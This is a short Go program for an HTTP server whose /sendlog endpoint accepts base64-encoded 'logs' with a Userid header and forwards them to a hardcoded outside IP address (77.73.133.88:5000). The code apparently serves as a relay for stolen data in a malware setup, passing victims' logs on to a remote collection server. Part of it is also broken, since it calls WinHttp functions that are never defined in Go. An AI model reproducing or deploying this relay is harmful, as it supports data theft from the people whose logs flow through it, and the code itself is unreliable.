package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {
	file, err := os.ReadFile("config.cfg")
	cherrstop(err)
	mux := http.NewServeMux()
	go mux.HandleFunc("/sendlog", handleConnection)
	println("\nYour server started on " + string(file))
	err = http.ListenAndServe(string(file), mux)
	cherrstop(err)
}

func cherrstop(err error) {
	if err != nil {
		fmt.Println(err)
		fmt.Scanln()
		panic(err)
	}
}

func cherr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func handleConnection(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		r.Body = http.MaxBytesReader(w, r.Body, 104857600)
		name := r.RemoteAddr
		name, _, _ = strings.Cut(name, ":")
		user := r.Header.Get("Userid")
		b64 := r.FormValue("B64")
		contenttype := "Content-Type: application/x-www-form-urlencoded"
		userid := "Userid: " + user
		h := WinHttpOpen("")
		s := WinHttpConnect(h, "77.73.133.88", 5000)
		parampost := []byte("B64=" + b64)
		m_hRequest := WinHttpOpenRequest(s, "POST", "/sendlog")
		WinHttpAddRequestHeaders(m_hRequest, contenttype, 0x20000000)
		WinHttpAddRequestHeaders(m_hRequest, userid, 0x20000000)
		WinHttpSendRequest(m_hRequest, parampost, len(parampost))
	}
}
